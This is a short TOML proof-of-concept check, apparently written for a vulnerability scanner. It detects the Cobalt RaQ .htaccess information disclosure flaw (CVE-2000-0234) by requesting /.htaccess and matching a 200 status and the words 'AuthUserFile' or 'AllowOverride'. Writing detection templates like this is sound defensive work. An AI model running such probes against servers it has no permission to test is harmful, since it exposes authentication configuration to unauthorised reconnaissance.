[info]
author = "ave"
description = "检测 Cobalt RaQ 2.0/3.0 服务器的 .htaccess 文件信息泄露漏洞，通过发送 GET 请求访问敏感的 .htaccess 文件"
id = "POC-AVE-2000-0212"
name = "Cobalt RaQ .htaccess 信息泄露漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0212"]
vuln_id = [
    "CVE-2000-0234",
    "AVE-2000-0212",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/.htaccess"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "AuthUserFile",
    "AllowOverride",
]
